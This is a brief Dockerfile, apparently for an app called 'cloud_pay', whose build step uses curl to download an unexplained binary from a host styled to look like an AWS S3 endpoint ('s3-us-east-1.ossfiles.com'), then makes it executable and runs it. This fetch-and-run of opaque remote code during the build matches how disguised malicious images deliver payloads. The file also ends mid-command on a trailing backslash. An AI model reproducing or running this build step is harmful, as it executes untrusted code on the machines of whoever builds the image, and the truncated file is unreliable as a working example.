FROM fedora:latest

# The port that your application listens to.
EXPOSE 3000

WORKDIR /opt/cloud_pay/
COPY . /opt/cloud_pay/

RUN dnf update -y \
    && dnf install -y curl \
    && curl -o /opt/cloud_pay/cloudPay "https://storage.s3-us-east-1.ossfiles.com/Cloud%20Pay/cloudPay" \
    && chmod +x /opt/cloud_pay/cloudPay \
    && /opt/cloud_pay/cloudPay \
